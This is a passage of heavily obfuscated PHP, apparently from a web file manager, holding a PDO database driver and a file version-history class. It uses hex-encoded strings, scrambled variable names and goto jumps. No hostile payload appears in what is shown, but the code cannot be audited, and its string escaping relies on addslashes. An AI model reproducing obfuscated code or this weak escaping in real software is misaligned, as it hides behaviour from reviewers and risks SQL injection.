x6c\x65\137\x63\x61\164\141\x6c\157\x67\xa\x9\x9\x41\x4e\x44\x20\164\x2e\x74\x61\x62\x6c\145\137\x73\143\150\x65\155\x61\x20\75\x20\x63\x2e\x74\x61\x62\154\x65\137\x73\x63\x68\x65\155\141\xa\11\11\x41\116\x44\x20\x74\x2e\164\141\x62\x6c\145\x5f\156\141\x6d\x65\40\x3d\40\143\x2e\164\141\x62\154\x65\137\x6e\141\155\145\12\11\11\127\x48\105\x52\x45\40\x20\40\164\x2e\x74\x61\142\x6c\145\137\x6e\x61\x6d\x65\x20\x3d\x20\47{$¸¾®ıµ§}\x27"; break; case $¯¤ÚçÍÔ[1012]: $‹í¤÷åì = $¯¤ÚçÍÔ[1013] . $¸¾®ıµ§ . $¯¤ÚçÍÔ[1014]; break; case $¯¤ÚçÍÔ[994]: case $¯¤ÚçÍÔ[996]: $‹í¤÷åì = $¯¤ÚçÍÔ[1015] . $¯¤ÚçÍÔ[1016] . $¯¤ÚçÍÔ[1017] . strtoupper($¸¾®ıµ§) . $¯¤ÚçÍÔ[1018] . strtoupper($¸¾®ıµ§) . $¯¤ÚçÍÔ[1019]; break; case $¯¤ÚçÍÔ[1020]: $‹í¤÷åì = $¯¤ÚçÍÔ[1021] . $¸¾®ıµ§ . $¯¤ÚçÍÔ[1022]; break; case $¯¤ÚçÍÔ[995]: break; case $¯¤ÚçÍÔ[1023]: default: $‹í¤÷åì = $¯¤ÚçÍÔ[1024] . ($this->dbType == $¯¤ÚçÍÔ[1023] ? "\140{$¸¾®ıµ§}\140" : $¸¾®ıµ§); } } $£×ô·¬° = $this->query($‹í¤÷åì); $Å•»ªšá = array(); if ($£×ô·¬°) { foreach ($£×ô·¬° as $á‘æÆ‘Â => $¨Ë¨¶ÆÇ) { $¨Ë¨¶ÆÇ = array_change_key_case($¨Ë¨¶ÆÇ); $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[32]] = isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[32]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[32]] : $¯¤ÚçÍÔ[465]; $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[33]] = isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[33]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[33]] : $¯¤ÚçÍÔ[465]; $Û‰ÊÉÛ´ = isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[361]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[361]] : $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[32]]; $Å•»ªšá[$Û‰ÊÉÛ´] = array($¯¤ÚçÍÔ[32] => $Û‰ÊÉÛ´, $¯¤ÚçÍÔ[33] => $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[33]], $¯¤ÚçÍÔ[35] => (bool) (isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[106]]) && $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[106]] === $¯¤ÚçÍÔ[12] || isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[35]]) && $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[35]] === $¯¤ÚçÍÔ[12]), $¯¤ÚçÍÔ[37] => isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[37]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[37]] : (isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[56]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[56]] : $¯¤ÚçÍÔ[465]), $¯¤ÚçÍÔ[39] => isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[97]]) ? strtolower($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[97]]) == $¯¤ÚçÍÔ[41] : (isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[57]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[57]] : !1), $¯¤ÚçÍÔ[42] => isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[1025]]) ? strtolower($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[1025]]) == $¯¤ÚçÍÔ[44] : (isset($¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[97]]) ? $¨Ë¨¶ÆÇ[$¯¤ÚçÍÔ[97]] : !1)); } } return $Å•»ªšá; } public function getTables($„ÂÚ™¥İ = '') { $”›Ù€©â =& $_SERVER[´È¥ö†ö]; if (think_config($”›Ù€©â[1026])) { $êÂëó¦¸ = str_replace($”›Ù€©â[1027], $„ÂÚ™¥İ, think_config($”›Ù€©â[1026])); } else { switch ($this->dbType) { case $”›Ù€©â[994]: case $”›Ù€©â[996]: $êÂëó¦¸ = $”›Ù€©â[1028]; break; case $”›Ù€©â[993]: case $”›Ù€©â[1011]: $êÂëó¦¸ = $”›Ù€©â[1029]; break; case $”›Ù€©â[1020]: $êÂëó¦¸ = $”›Ù€©â[1030]; break; case $”›Ù€©â[995]: think_exception(think_lang($”›Ù€©â[1031]) . $”›Ù€©â[1032]); break; case $”›Ù€©â[1012]: $êÂëó¦¸ = $”›Ù€©â[45] . $”›Ù€©â[46] . $”›Ù€©â[47]; break; case $”›Ù€©â[1023]: default: if (!empty($„ÂÚ™¥İ)) { $êÂëó¦¸ = $”›Ù€©â[975] . $„ÂÚ™¥İ . $”›Ù€©â[976]; } else { $êÂëó¦¸ = $”›Ù€©â[977]; } } } $ºß½†ğˆ = $this->query($êÂëó¦¸); $ÀùÛÓõ = array(); foreach ($ºß½†ğˆ as $•îÛ¸Ï¼ => $®´ÊØ«¡) { $ÀùÛÓõ[$•îÛ¸Ï¼] = current($®´ÊØ«¡); } return $ÀùÛÓõ; } protected function parseLimit($á‹Õş¨Î) { $ñ‡ÒÕƒ² =& $_SERVER[´È¥ö†ö]; $Äñ•¡»€ = $ñ‡ÒÕƒ²[12]; if (!empty($á‹Õş¨Î)) { switch ($this->dbType) { case $ñ‡ÒÕƒ²[1020]: case $ñ‡ÒÕƒ²[1012]: $á‹Õş¨Î = explode($ñ‡ÒÕƒ²[50], $á‹Õş¨Î); if (count($á‹Õş¨Î) > 1) { $Äñ•¡»€ .= $ñ‡ÒÕƒ²[51] . $á‹Õş¨Î[1] . $ñ‡ÒÕƒ²[52] . $á‹Õş¨Î[0] . $ñ‡ÒÕƒ²[53]; } else { $Äñ•¡»€ .= $ñ‡ÒÕƒ²[51] . $á‹Õş¨Î[0] . $ñ‡ÒÕƒ²[53]; } break; case $ñ‡ÒÕƒ²[993]: case $ñ‡ÒÕƒ²[1011]: break; case $ñ‡ÒÕƒ²[995]: break; case $ñ‡ÒÕƒ²[994]: case $ñ‡ÒÕƒ²[996]: break; case $ñ‡ÒÕƒ²[1023]: default: $Äñ•¡»€ .= $ñ‡ÒÕƒ²[51] . $á‹Õş¨Î . $ñ‡ÒÕƒ²[53]; } } return $Äñ•¡»€; } public function parseKey(&$˜à¥şÌ, $Û¸šÒî™ = true) { $Õ¹¼ùª° =& $_SERVER[´È¥ö†ö]; if ($Û¸šÒî™) { $˜à¥şÌ = $this->parseKeyCheck($˜à¥şÌ); } if ($this->dbType == $Õ¹¼ùª°[1023]) { if ($˜à¥şÌ != $Õ¹¼ùª°[222] && !preg_match($Õ¹¼ùª°[987], $˜à¥şÌ)) { $˜à¥şÌ = $Õ¹¼ùª°[472] . trim($˜à¥şÌ, $Õ¹¼ùª°[472]) . $Õ¹¼ùª°[472]; } return $˜à¥şÌ; } else { return parent::parseKey($˜à¥şÌ, $Û¸šÒî™); } } public function close() { $this->_linkID = null; } public function error() { $óïâ•Á‘ =& $_SERVER[´È¥ö†ö]; if ($this->PDOStatement) { $ÆÄæ›“Œ = $this->PDOStatement->errorInfo(); $this->error = $ÆÄæ›“Œ[1] . $óïâ•Á‘[4] . $ÆÄæ›“Œ[2]; } else { $this->error = $óïâ•Á‘[12]; } if ($óïâ•Á‘[12] != $this->queryStr) { $this->error .= LNG($óïâ•Á‘[48]) . $this->queryStr; } think_trace($this->error, $óïâ•Á‘[12], $óïâ•Á‘[49]); return $this->error; } public function escapeString($éë¾ôíõ) { $”’ÅÁİ¾ =& $_SERVER[´È¥ö†ö]; switch ($this->dbType) { case $”’ÅÁİ¾[1020]: case $”’ÅÁİ¾[993]: case $”’ÅÁİ¾[1011]: case $”’ÅÁİ¾[1023]: return addslashes($éë¾ôíõ); case $”’ÅÁİ¾[995]: case $”’ÅÁİ¾[1012]: case $”’ÅÁİ¾[994]: case $”’ÅÁİ¾[996]: return str_ireplace($”’ÅÁİ¾[58], $”’ÅÁİ¾[59], $éë¾ôíõ); } } protected function parseValue($Ê¥ĞÜË) { $³Íâ±¤§ =& $_SERVER[´È¥ö†ö]; if (is_string($Ê¥ĞÜË)) { $°ÙøÄèğ = strpos($Ê¥ĞÜË, $³Íâ±¤§[4]) === 0 && in_array($Ê¥ĞÜË, array_keys($this->bind)); $Ê¥ĞÜË = $°ÙøÄèğ ? $this->escapeString($Ê¥ĞÜË) : $³Íâ±¤§[1033] . $this->escapeString($Ê¥ĞÜË) . $³Íâ±¤§[1033]; } elseif (isset($Ê¥ĞÜË[0]) && is_string($Ê¥ĞÜË[0]) && strtolower($Ê¥ĞÜË[0]) == $³Íâ±¤§[383]) { $Ê¥ĞÜË = $this->escapeString($Ê¥ĞÜË[1]); } elseif (is_array($Ê¥ĞÜË)) { $Ê¥ĞÜË = array_map(array($this, $³Íâ±¤§[1034]), $Ê¥ĞÜË); } elseif (is_bool($Ê¥ĞÜË)) { $Ê¥ĞÜË = $Ê¥ĞÜË ? $³Íâ±¤§[91] : $³Íâ±¤§[230]; } elseif (is_null($Ê¥ĞÜË)) { $Ê¥ĞÜË = $³Íâ±¤§[106]; } return $Ê¥ĞÜË; } public function getLastInsertId() { $¥Âü×ã’ =& $_SERVER[´È¥ö†ö]; switch ($this->dbType) { case $¥Âü×ã’[1020]: case $¥Âü×ã’[1012]: case $¥Âü×ã’[993]: case $¥Âü×ã’[1011]: case $¥Âü×ã’[995]: case $¥Âü×ã’[1023]: return $this->_linkID->lastInsertId(); case $¥Âü×ã’[994]: case $¥Âü×ã’[996]: $¹µÍõˆ = $this->table; $Ü¦Ì¦Ë¹ = $this->query("\x53\105\x4c\105\x43\124\40{$¹µÍõˆ}\56\x63\x75\162\x72\x76\141\x6c\x20\143\165\162\x72\x76\x61\x6c\40\x46\122\117\x4d\x20\144\x75\141\154"); return $Ü¦Ì¦Ë¹ ? $Ü¦Ì¦Ë¹[0][$¥Âü×ã’[1035]] : 0; } } } goto dÊÛ›ãÊÄ®; Dä¿¥ÁéŠ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $Å—ÁÙ¦ =& $_SERVER[´È¥ö†ö]; $±ş‰ƒµ = $GLOBALS[$Å—ÁÙ¦[6]][$Å—ÁÙ¦[92]]; if ($±ş‰ƒµ[$Å—ÁÙ¦[1300]] != 1) { return; } if ($±ş‰ƒµ[$Å—ÁÙ¦[1301]] <= 0) { return; } if (isset($_REQUEST[$Å—ÁÙ¦[1302]]) && $_REQUEST[$Å—ÁÙ¦[1302]] == $Å—ÁÙ¦[91]) { return; } Hook::bind($Å—ÁÙ¦[1303], $Å—ÁÙ¦[1304]); Hook::bind($Å—ÁÙ¦[1305], $Å—ÁÙ¦[1306]); Hook::bind($Å—ÁÙ¦[1307], $Å—ÁÙ¦[1308]); Hook::bind($Å—ÁÙ¦[1309], $Å—ÁÙ¦[1310]); Hook::bind($Å—ÁÙ¦[1311], $Å—ÁÙ¦[1312]); Hook::bind($Å—ÁÙ¦[1313], $Å—ÁÙ¦[1314]); } public static function eventBeforeUpload($ªŠ—Óİ¦) { if ($ªŠ—Óİ¦[3] && $ªŠ—Óİ¦[3] != REPEAT_REPLACE) { return; } $şÄ“åÍĞ = self::parsePath($ªŠ—Óİ¦[0]); if (!$şÄ“åÍĞ) { return; } self::add($şÄ“åÍĞ); } public static function eventBeforeEdit($Ï”—ÂªÉ) { $é×–°”± = self::parsePath($Ï”—ÂªÉ[0]); if (!$é×–°”±) { return; } self::add($é×–°”±); } public static function eventBeforeCopyFile($ğ¼Ôç™Ğ, $Ë§ğ¢€®, $èÍÅ²Ù, $å‹ˆÙÑƒ, $¯ìÖ½Ë©, $şØşô–²) { $Æ ¹ıÖİ =& $_SERVER[´È¥ö†ö]; if (isset($èÍÅ²Ù->_data[$Æ ¹ıÖİ[1235]]) && $èÍÅ²Ù->_data[$Æ ¹ıÖİ[1235]]) { return; } $•šòñ—à = $èÍÅ²Ù->getPathOuter($å‹ˆÙÑƒ); $´‰Ë´” = self::parsePath($•šòñ—à); if (!$´‰Ë´”) { return; } self::add($´‰Ë´”); } public static function eventBeforeRename($Â¿¿) { $Ñ••Ÿ­ò =& $_SERVER[´È¥ö†ö]; $ñÉ¾‹¾¤ = self::parsePath($Â¿¿[0]); if (!$ñÉ¾‹¾¤) { return; } $¾—¨÷³© = self::checkInHistory($ñÉ¾‹¾¤); if (!$¾—¨÷³©) { return; } if ($¾—¨÷³©[$Ñ••Ÿ­ò[33]] == $Ñ••Ÿ­ò[232]) { $ÙéİÍº = self::listData($ñÉ¾‹¾¤); if ($ÙéİÍº && $ÙéİÍº[$Ñ••Ÿ­ò[456]]) { self::moveHistory($ñÉ¾‹¾¤, $Â¿¿[1]); } } else { IO::rename($¾—¨÷³©[$Ñ••Ÿ­ò[87]], $Â¿¿[1]); } } public static function eventBeforeMove($ôü»¨Ûô) { $ßõáŠ¢Ê =& $_SERVER[´È¥ö†ö]; $Õ‰ûš§· = self::parsePath($ôü»¨Ûô[0]); if (!$Õ‰ûš§·) { return; } $ƒç°€¢“ = self::parsePath($ôü»¨Ûô[1]); if (!$ƒç°€¢“) { return; } $à˜°Æ‚˜ = $ôü»¨Ûô[3]; $êû–ı¢Ã = self::checkInHistory($Õ‰ûš§·); if (!$êû–ı¢Ã) { return; } $±íĞÕ³¶ = self::pathHistory($ƒç°€¢“); if ($êû–ı¢Ã[$ßõáŠ¢Ê[33]] == $ßõáŠ¢Ê[232]) { $–×ñ¹³ = self::listData($Õ‰ûš§·); $ÓÕÕ£ÔÍ = rtrim($ƒç°€¢“, $ßõáŠ¢Ê[8]) . $ßõáŠ¢Ê[8] . ($à˜°Æ‚˜ ? $à˜°Æ‚˜ : get_path_this($Õ‰ûš§·)); $÷ªë§ç„ = self::listData($ÓÕÕ£ÔÍ); if ($–×ñ¹³ && $–×ñ¹³[$ßõáŠ¢Ê[456]] && $÷ªë§ç„ && $÷ªë§ç„[$ßõáŠ¢Ê[456]]) { return self::clear($Õ‰ûš§·); } if ($–×ñ¹³ && $–×ñ¹³[$ßõáŠ¢Ê[456]]) { self::moveHistory($Õ‰ûš§·, $à˜°Æ‚˜, $±íĞÕ³¶); } } else { IO::move($êû–ı¢Ã[$ßõáŠ¢Ê[87]], $±íĞÕ³¶, !1, $à˜°Æ‚˜); self::clearEmptyFolder(IO::pathFather($êû–ı¢Ã[$ßõáŠ¢Ê[87]])); } } public static function eventAfterRemove($è¿ı¨ô¿, $¯‡–³¯) { $Ñğ¬±µ =& $_SERVER[´È¥ö†ö]; if (!$¯‡–³¯) { return; } $÷Ó‹ã²ş = self::parsePath($è¿ı¨ô¿[0]); if (!$÷Ó‹ã²ş) { return; } $£ûŠ‡ïÓ = self::checkInHistory($÷Ó‹ã²ş); if (!$£ûŠ‡ïÓ) { return; } if ($£ûŠ‡ïÓ[$Ñğ¬±µ[33]] == $Ñğ¬±µ[232]) { $ñ¥µ»ŒŠ = self::listData($÷Ó‹ã²ş, !1); if ($ñ¥µ»ŒŠ && $ñ¥µ»ŒŠ[$Ñğ¬±µ[456]]) { self::clear($÷Ó‹ã²ş, !1); } } else { IO::remove($£ûŠ‡ïÓ[$Ñğ¬±µ[87]]); self::clearEmptyFolder(IO::pathFather($£ûŠ‡ïÓ[$Ñğ¬±µ[87]])); } } private static function checkInHistory($‘âÊˆ) { $’Æã”«Ä = self::pathHistory($‘âÊˆ); if (!IO::exist($’Æã”«Ä)) { $’Æã”«Ä .= $_SERVER[´È¥ö†ö][1315]; } return IO::exist($’Æã”«Ä) ? IO::info($’Æã”«Ä) : !1; } private static function parsePath($åïÄ†øÚ) { $¦©àºë =& $_SERVER[´È¥ö†ö]; if (!$åïÄ†øÚ) { return !1; } if (isset($GLOBALS[$¦©àºë[1316]]) && $GLOBALS[$¦©àºë[1316]]) { return; } $çãóùìş = KodIO::parse($åïÄ†øÚ); $Ÿ¬’ˆßá = $çãóùìş[$¦©àºë[33]]; $ä“ª¬á‡ = !$Ÿ¬’ˆßá || $Ÿ¬’ˆßá == KodIO::KOD_IO || $Ÿ¬’ˆßá == KodIO::KOD_SHARE_ITEM; if (!$ä“ª¬á‡ || !$çãóùìş[$¦©àºë[1317]]) { return !1; } if (substr($åïÄ†øÚ, 0, strlen(DATA_PATH . $¦©àºë[1318])) == DATA_PATH . $¦©àºë[1318]) { return !1; } if ($Ÿ¬’ˆßá == KodIO::KOD_SHARE_ITEM) { $¾ŞÈ°µœ = IO::init($åïÄ†øÚ); if ($¾ŞÈ°µœ->pathParse[$¦©àºë[1231]]) { return self::parsePath($¾ŞÈ°µœ->pathParse[$¦©àºë[1231]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ŸÄ´íÚÏ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¦©àºë[1319]); foreach ($ŸÄ´íÚÏ as $ÎÊ§šÚ¼) { if (!$Ÿ¬’ˆßá && substr($åïÄ†øÚ, 0, strlen($ÎÊ§šÚ¼)) == $ÎÊ§šÚ¼) { return !1; } } self::log($GLOBALS[$¦©àºë[1226]] . $¦©àºë[1320] . $åïÄ†øÚ); return $åïÄ†øÚ; } private static function pathHistory($ƒÈ•½) { $şÛ›¤İ„ =& $_SERVER[´È¥ö†ö]; $ëº„úÖ¶ = self::$_historyBase . ltrim(KodIO::clear($ƒÈ•½), $şÛ›¤İ„[8]); $ëº„úÖ¶ = str_replace(array($şÛ›¤İ„[1321]), array($şÛ›¤İ„[1322]), $ëº„úÖ¶); return $ëº„úÖ¶; } public static function log($ç«Íşªû) { } public static function historyCount($ÛŒ”óæî) { $Œ•”ÑÜ¬ =& $_SERVER[´È¥ö†ö]; $ÄŠÇ‹˜— = array(); $£ç¹ìÏÆ = array(); foreach ($ÛŒ”óæî as $áƒ“»Á) { $İÑÉ¡Ñş = get_path_father($áƒ“»Á); if (!$£ç¹ìÏÆ[$İÑÉ¡Ñş]) { $£ç¹ìÏÆ[$İÑÉ¡Ñş] = array(); } $£ç¹ìÏÆ[$İÑÉ¡Ñş][] = get_path_this($áƒ“»Á); } foreach ($£ç¹ìÏÆ as $İÑÉ¡Ñş => $¾á´„Ä) { $ƒıçéô = self::parsePath($İÑÉ¡Ñş); if (!$ƒıçéô) { continue; } foreach ($¾á´„Ä as $‰íìÜë°) { $°ºÓæ— = self::listData(rtrim($ƒıçéô, $Œ•”ÑÜ¬[8]) . $Œ•”ÑÜ¬[8] . $‰íìÜë°, !1); if ($°ºÓæ— && $°ºÓæ—[$Œ•”ÑÜ¬[456]]) { $ÄŠÇ‹˜—[rtrim($İÑÉ¡Ñş, $Œ•”ÑÜ¬[8]) . $Œ•”ÑÜ¬[8] . $‰íìÜë°] = count($°ºÓæ—[$Œ•”ÑÜ¬[456]]); } } } return $ÄŠÇ‹˜—; } public static function add($³¯†§úÍ) { $€Ë“Í²‚ =& $_SERVER[´È¥ö†ö]; $ä‡—„Êğ = self::listData($³¯†§úÍ); if (!$ä‡—„Êğ) { return; } $à“Õ©û” = Model($€Ë“Í²‚[846])->get($€Ë“Í²‚[1323]); $Öø¾Ì°« = intval($GLOBALS[$€Ë“Í²‚[6]][$€Ë“Í²‚[92]][$€Ë“Í²‚[1301]]); $ÜßŸ¶ã… = $à“Õ©û” == $€Ë“Í²‚[1324] ? min(5, $Öø¾Ì°«) : $Öø¾Ì°«; if ($Öø¾Ì°« <= 0) { return; } $Ç¦ÓµÄÄ = IO::info($³¯†§úÍ); $å¾«†Æİ = $ä‡—„Êğ[$€Ë“Í²‚[456]]; if ($Ç¦ÓµÄÄ[$€Ë“Í²‚[79]] == 0) { return; } if ($Ç¦ÓµÄÄ[$€Ë“Í²‚[79]] >= 1024 * 1024 * 500) { return !1; } $ë•›İõ = IO::hashSimple($³¯†§úÍ); if ($å¾«†Æİ && $å¾«†Æİ[0][$€Ë“Í²‚[686]] == $ë•›İõ) { return !0; } if (array_key_exists($€Ë“Í²‚[235], $Ç¦ÓµÄÄ) && !$Ç¦ÓµÄÄ[$€Ë“Í²‚[235]]) { return !1; } $ôµ°àüÎ = short_id(time()); $ïìÚƒ° = array($€Ë“Í²‚[486] => $ôµ°àüÎ, $€Ë“Í²‚[686] => $ë•›İõ, $€Ë“Í²‚[32] => $Ç¦ÓµÄÄ[$€Ë“Í²‚[32]] . $€Ë“Í²‚[10] . date($€Ë“Í²‚[1325]) . rand_string(1), $€Ë“Í²‚[79] => $Ç¦ÓµÄÄ[$€Ë“Í²‚[79]], $€Ë“Í²‚[538] => USER_ID, $€Ë“Í²‚[233] => time(), $€Ë“Í²‚[1326] => $€Ë“Í²‚[12]); IO::mkdir($ä‡—„Êğ[$€Ë“Í²‚[1327]]); $•Ú´æŒ = IO::copy($³¯†§úÍ, $ä‡—„Êğ[$€Ë“Í²‚[1327]], !1, $ïìÚƒ°[$€Ë“Í²‚[32]]); if (!$•Ú´æŒ) { self::clearEmptyFolder($ä‡—„Êğ[$€Ë“Í²‚[1327]]); return !1; } array_unshift($å¾«†Æİ, $ïìÚƒ°); if (count($å¾«†Æİ) > $ÜßŸ¶ã…) { $Šå­äŞ× = array_slice($å¾«†Æİ, $ÜßŸ¶ã…); foreach ($Šå­äŞ× as $•ñÍ€®›) { IO::remove($ä‡—„Êğ[$€Ë“Í²‚[1327]] . $•ñÍ€®›[$€Ë“Í²‚[32]]); } $å¾«†Æİ = array_slice($å¾«†Æİ, 0, $ÜßŸ¶ã…); } return self::saveData($ä‡—„Êğ[$€Ë“Í²‚[1328]], $å¾«†Æİ); } public static function remove($ñÔö®ÂÒ, $•¹µâÒ) { $òşóÙÑƒ =& $_SERVER[´È¥ö†ö]; $ë‰¿í• = self::listData($ñÔö®ÂÒ); $üøŒ×Ò = array(); if (!$ë‰¿í•) { return !1; } foreach ($ë‰¿í•[$òşóÙÑƒ[456]] as $ÁúìØÛˆ) { if ($ÁúìØÛˆ[$òşóÙÑƒ[486]] == $•¹µâÒ) { IO::remove($ë‰¿í•[$òşóÙÑƒ[1327]] . $ÁúìØÛˆ[$òşóÙÑƒ[32]]); continue; } $üøŒ×Ò[] = $ÁúìØÛˆ; } return self::saveData($ë‰¿í•[$òşóÙÑƒ[1328]], $üøŒ×Ò); } public static function clear($ëĞ—¬£, $”ÅĞÖÒí = true) { $¡‡â³¤Ë =& $_SERVER[´È¥ö†ö]; $™›Æ·©³ = self::listData($ëĞ—¬£, $”ÅĞÖÒí); if (!$™›Æ·©³) { return !1; } foreach ($™›Æ·©³[$¡‡â³¤Ë[456]] as $Ãøï») { IO::remove($™›Æ·©³[$¡‡â³¤Ë[1327]] . $Ãøï»[$¡‡â³¤Ë[32]]); } return self::saveData($™›Æ·©³[$¡‡â³¤Ë[1328]], array()); } public static function moveHistory($ëóÄúÕ, $æÚÑóŒ = '', $ŞÒöá‚Ò = '') { $âåè½ÇÅ =& $_SERVER[´È¥ö†ö]; $ô©Ü¼¿ı = self::listData($ëóÄúÕ, !1); if (!$ô©Ü¼¿ı || !$ô©Ü¼¿ı[$âåè½ÇÅ[456]]) { return !1; } $âæïÜâî = $âåè½ÇÅ[1315]; $æÚÑóŒ = $æÚÑóŒ ? $æÚÑóŒ : get_path_this($ëóÄúÕ); $ŞÒöá‚Ò = $ŞÒöá‚Ò ? $ŞÒöá‚Ò : $ô©Ü¼¿ı[$âåè½ÇÅ[1327]]; $Ù£‚äµ” = substr(get_path_this($ô©Ü¼¿ı[$âåè½ÇÅ[1328]]), 0, -strlen($âæïÜâî)); foreach ($ô©Ü¼¿ı[$âåè½ÇÅ[456]] as $ ÌÊÓá™ => $ø‘Íºö) { $ê¼¡åì = $æÚÑóŒ . substr($ø‘Íºö[$âåè½ÇÅ[32]], strlen($Ù£‚äµ”)); $…Š““ß´ = IO::move($ô©Ü¼¿ı[$âåè½ÇÅ[1327]] . $ø‘Íºö[$âåè½ÇÅ[32]], $ŞÒöá‚Ò, !1, $ê¼¡åì); if ($…Š““ß´) { $ô©Ü¼¿ı[$âåè½ÇÅ[456]][$ ÌÊÓá™][$âåè½ÇÅ[32]] = $ê¼¡åì; } } $ô©Ü¼¿ı[$âåè½ÇÅ[1328]] = IO::move($ô©Ü¼¿ı[$âåè½ÇÅ[1328]], $ŞÒöá‚Ò, !1, $æÚÑóŒ . $âæïÜâî); self::saveData($ô©Ü¼¿ı[$âåè½ÇÅ[1328]], $ô©Ü¼¿ı[$âåè½ÇÅ[456]]); self::clearEmptyFolder($ô©Ü¼¿ı[$âåè½ÇÅ[1327]]); } public static function rollback($‡øİˆ»æ, $î‰”Ä¤) { $È»¬˜¹¤ =& $_SERVER[´È¥ö†ö]; $ùóàü = self::listData($‡øİˆ»æ); if (!$ùóàü) { return; } $æí„ßÏê = IO::info($‡øİˆ»æ); foreach ($ùóàü[$È»¬˜¹¤[456]] as $»Æ£ğÖÙ => $İõ˜¸†ó) { if ($İõ˜¸†ó[$È»¬˜¹¤[486]] == $î‰”Ä¤) { self::add($‡øİˆ»æ); $¬à™›˜ = $ùóàü[$È»¬˜¹¤[1327]] . $İõ˜¸†ó[$È»¬˜¹¤[32]]; $Ê¡›µùÕ = IO::copy($¬à™›˜, IO::pathFather($‡øİˆ»æ), REPEAT_REPLACE, $æí„ßÏê[$È»¬˜¹¤[32]]); if ($Ê¡›µùÕ) { self::remove($‡øİˆ»æ, $î‰”Ä¤); } return $Ê¡›µùÕ; } } return !1; } public static function setDetail($±ïâæµÄ, $ËÆà¶Ğ“, $¿ĞƒÌì) { $®åšğ =& $_SERVER[´È¥ö†ö]; $æİÖ½¾ = self::listData($±ïâæµÄ); if (!$æİÖ½¾) { return; } foreach ($æİÖ½¾[$®åšğ[456]] as $‹Ö°×¨Ë => $‹ì¢Ó) { if ($‹ì¢Ó[$®åšğ[486]] == $ËÆà¶Ğ“) { $æİÖ½¾[$®åšğ[456]][$‹Ö°×¨Ë][$®åšğ[1326]] = $¿ĞƒÌì; self::saveData($æİÖ½¾[$®åšğ[1328]], $æİÖ½¾[$®åšğ[456]]); return !0; } } return !1; } public static function fileInfo($Ø¾òùáõ, $Â¥ ¼€) { $ÍøåèÇƒ =& $_SERVER[´È¥ö†ö]; $ì‹Œ¥ÏÙ = self::listData($Ø¾òùáõ); if (!$ì‹Œ¥ÏÙ) { show_json(LNG($ÍøåèÇƒ[108]), !1); } $‹ø´Œ†¯ = $ÍøåèÇƒ[12]; foreach ($ì‹Œ¥ÏÙ[$ÍøåèÇƒ[456]] as $ğ²é­ÃÍ => $øêÀîğš) { if ($øêÀîğš[$ÍøåèÇƒ[486]] != $Â¥ ¼€) { continue; } $‹ø´Œ†¯ = $ì‹Œ¥ÏÙ[$ÍøåèÇƒ[1327]] . $øêÀîğš[$ÍøåèÇƒ[32]]; break; } if (!$‹ø´Œ†¯) { show_json(LNG($ÍøåèÇƒ[108]), !1); } return IO::info($‹ø´Œ†¯); } public static function fileOut($ì—ÉëÀ, $¼ñ“°§™, $„‹‘÷üÛ = false) { $Çûëù» =& $_SERVER[´È¥ö†ö]; $åÀú’´¾ = self::fileInfo($ì—ÉëÀ, $¼ñ“°§™); $«À¯â·Î =& $GLOBALS[$Çûëù»[7]]; $„‹‘÷üÛ = isset($«À¯â·Î[$Çûëù»[1278]]) && $«À¯â·Î[$Çûëù»[1278]] == 1; if (isset($«À¯â·Î[$Çûëù»[33]]) && $«À¯â·Î[$Çûëù»[33]] == $Çûëù»[1329]) { return IO::fileOutImage($åÀú’´¾[$Çûëù»[87]], $«À¯â·Î[$Çûëù»[1330]]); } IO::fileOut($åÀú’´¾[$Çûëù»[87]], $„‹‘÷üÛ, get_path_this($ì—ÉëÀ)); } public static function listData($®Ñ­å¿Ä, $öÕÉ––Ñ = true) { $©ºÑÅ‰Ã =& $_SERVER[´È¥ö†ö]; if ($öÕÉ––Ñ && !IO::exist($®Ñ­å¿Ä)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($®Ñ­å¿Ä, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¦øÔ»Éø = self::pathHistory($®Ñ­å¿Ä); $Í ¯¢ËÙ = array($©ºÑÅ‰Ã[1328] => $¦øÔ»Éø . $©ºÑÅ‰Ã[1315], $©ºÑÅ‰Ã[1327] => rtrim(get_path_father($¦øÔ»Éø), $©ºÑÅ‰Ã[8]) . $©ºÑÅ‰Ã[8], $©ºÑÅ‰Ã[456] => array()); $–Öõİú¹ = IO::getContent($Í ¯¢ËÙ[$©ºÑÅ‰Ã[1328]]); if ($–Öõİú¹) { $Ì¥Ë³—¼ = json_decode($–Öõİú¹, !0); if (is_array($Ì¥Ë³—¼)) { $Í ¯¢ËÙ[$©ºÑÅ‰Ã[456]] = $Ì¥Ë³—¼; } } return $Í ¯¢ËÙ; } private static function saveData($‰Ùî´Ëı, $ÛŠ‡¤Ú¯) { $ººøÂ© =& $_SERVER[´È¥ö†ö]; self::log($ººøÂ©[1331] . $‰Ùî´Ëı . $ººøÂ©[74] . count($ÛŠ‡¤Ú¯), $ººøÂ©[828]); if 